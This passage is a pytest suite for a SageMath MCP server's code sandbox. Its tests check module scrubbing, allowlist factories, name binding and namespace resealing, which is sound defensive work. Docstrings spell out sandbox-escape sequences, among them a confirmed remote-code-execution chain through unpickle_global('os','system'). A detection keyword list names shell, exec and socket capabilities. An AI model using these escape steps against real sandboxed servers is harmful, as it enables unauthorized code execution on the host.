    `attrcall`, then `raw_getattr` and `getattr_debug`. Listing the *modules*
    that exist to resolve attributes by name means a helper a future SageMath
    adds to one of them is scrubbed on arrival rather than found by probing.

    The source scan that would otherwise catch these cannot: 807 of the 1902
    allowlisted names are compiled Cython with no readable source, and
    `attrcall` is one of them.
    """
    from sagemath_mcp._sage_worker import _DANGEROUS_SAGE_MODULES

    for module in ("sage.misc.call", "sage.cpython.getattr", "sage.cpython.debug"):
        assert module in _DANGEROUS_SAGE_MODULES, (
            f"{module} defines attribute-by-name plumbing and must be scrubbed wholesale"
        )


def test_no_allowlisted_factory_hands_back_a_dangerous_object() -> None:
    """The allowlist governs *names*; an object's methods escape it entirely.

    Once caller code holds an object, only the attribute rules apply to what it
    can call on it -- so an allowlisted factory that returns a rich object is a
    way past the name check that no name check can see. `get_display_manager()`
    was the one that existed: it hands back a `DisplayManager` carrying
    `switch_backend` and `graphics_from_save`, which takes a caller-supplied
    callable.

    Neither turned out to be exploitable -- no `BackendBase` is reachable to
    switch to, and `graphics_from_save` can only invoke a callable the caller
    could already call -- but the shape is worth keeping shut, and the whole
    rich-output subsystem has no purpose over MCP anyway: results come back as
    strings and plots as base64 PNGs.

    This is the structural check rather than the instance: it fails if a future
    Sage adds a zero-argument factory whose result exposes something dangerous.
    Zero-argument only, because calling anything else needs arguments this test
    would have to invent.
    """
    import contextlib
    import inspect
    import io

    sage = pytest.importorskip("sage.all")  # noqa: F841 - real Sage only
    from sagemath_mcp._sage_worker import _build_namespace
    from sagemath_mcp.allowlist import ALLOWED_CALLER_NAMES

    namespace = _build_namespace()
    dangerous = (
        "system", "popen", "spawn", "exec", "eval", "compile", "import", "open",
        "write", "unlink", "remove", "rmtree", "chmod", "socket", "urlopen",
        "download", "fetch", "install", "backend", "shell", "run",
    )
    prefixes = SECURITY_POLICY.forbidden_attribute_prefixes

    reachable: list[str] = []
    for name in sorted(ALLOWED_CALLER_NAMES):
        factory = namespace.get(name)
        if factory is None or not callable(factory) or inspect.isclass(factory):
            continue
        try:
            # Reading a signature resolves a lazy import, and some are broken in
            # a given Sage -- 10.9 raises AttributeError for
            # `is_ProductProjectiveSpaces` here, not at call time.
            if inspect.signature(factory).parameters:
                continue
        except BaseException:
            continue
        try:
            # license() and credits() print; keep the failure message readable.
            with contextlib.redirect_stdout(io.StringIO()):
                produced = factory()
        except BaseException:  # a factory that refuses to be called is fine
            continue
        try:
            attributes = dir(produced)
        except BaseException:  # an object that refuses introspection is fine
            continue
        for attribute in attributes:
            if attribute.startswith("_") or attribute.startswith(prefixes):
                continue
            lowered = attribute.lower()
            if not any(word in lowered for word in dangerous):
                continue
            try:
                # Reading an attribute can resolve a lazy import, and some of
                # those are broken in a given Sage: 10.9 raises AttributeError
                # for `is_ProductProjectiveSpaces`. Unreadable means unreachable.
                value = getattr(produced, attribute, None)
            except BaseException:
                continue
            if callable(value):
                reachable.append(f"{name}() -> {type(produced).__name__}.{attribute}")

    # `version()` returns a str, whose removeprefix/removesuffix match "remove".
    reachable = [r for r in reachable if not r.startswith("version()")]
    assert not reachable, (
        "these allowlisted factories hand back objects with methods the name "
        f"allowlist cannot govern: {reachable}"
    )


def test_a_binding_cannot_authorize_a_name_that_already_exists() -> None:
    """A binding authorizes a name the caller *creates*, not one already there.

    The hole, reproduced against a worker started with a custom
    `SAGEMATH_MCP_STARTUP` that preloads `smuggled`:

        smuggled()                              -> refused, correctly
        leaked = smuggled(); smuggled = None    -> **executed the preloaded object**

    `_bound_names` collects targets across the whole module without asking
    whether the assignment has run yet, so binding `smuggled` at the end
    authorized reading it at the start -- and at that point the name still holds
    the preloaded object. Splitting it across two calls worked too, with the
    binding in a statement that raised before assigning anything.

    The dunder case of this was closed in item 30 by refusing to record dunders.
    That was the same bug seen through a keyhole: the general rule is that a
    name which is live but not offered may not be authorized by anything.
    """
    module = ast.parse("leaked = smuggled(); smuggled = None; leaked")

    # Without the rule, the binding makes this pass.
    validate_module(module, extra_allowed_names=frozenset({"smuggled"}))

    with pytest.raises(SecurityViolation, match="not a name this server offers"):
        validate_module(
            module,
            extra_allowed_names=frozenset({"smuggled"}),
            withheld_names=frozenset({"smuggled"}),
        )


def test_withholding_does_not_disturb_ordinary_variables() -> None:
    """The rule must only bite names that are live and unoffered."""
    validate_module(
        ast.parse("total = 1\ntotal + 1"),
        withheld_names=frozenset({"smuggled"}),
    )
    # Shadowing an offered name is still fine: `x` is predefined and allowlisted.
    validate_module(ast.parse("x = 5\nx + 1"), withheld_names=frozenset({"smuggled"}))


@pytest.mark.asyncio
async def test_a_trusted_tool_call_cannot_reopen_the_scrubbed_namespace() -> None:
    """The scrub must survive the prelude that undoes it.

    Confirmed as remote code execution against SageMath 10.9 before the fix.
    Three steps, and the middle one is *any* specialised tool at all:

        1.  if False: unpickle_global = 1          # dead binding, authorized
        2.  <calculate_expression, or any tool>    # prelude re-imports sage.all
        3.  unpickle_global('os', 'system')(...)   # wrote uid=1001(sage)

    The generated prelude runs `from sage.all import *` in the *same persistent
    namespace* as caller code, which restores every name the startup scrub had
    removed. `unpickle_global` is protected only by that scrub -- unlike
    `cython` or `pari`, which the AST rules refuse by name -- so it came back
    fully reachable, and a caller who had bound the name in dead code could read
    it.

    The namespace is therefore resealed after trusted execution rather than only
    at startup. A snapshot taken once cannot cover names that appear later.
    """
    from sagemath_mcp import _sage_worker

    namespace = {"__builtins__": {}}
    # Stand in for what `from sage.all import *` puts back.
    namespace["unpickle_global"] = lambda *a: "reopened"
    namespace["cython"] = lambda *a: "reopened"

    _sage_worker._reseal_namespace(namespace)

    assert "unpickle_global" not in namespace, (
        "a name the startup scrub removes must not survive a reseal"
    )
    assert "cython" not in namespace


@pytest.mark.asyncio
async def test_resealing_keeps_what_the_caller_built() -> None:
    """And it must not take the caller's own work with it."""
    from sagemath_mcp import _sage_worker

    namespace = {"__builtins__": {}, "total": 45, "my_helper": lambda: 1, "x": "symbol"}
    _sage_worker._reseal_namespace(namespace)

    assert namespace["total"] == 45
    assert "my_helper" in namespace
    assert "x" in namespace
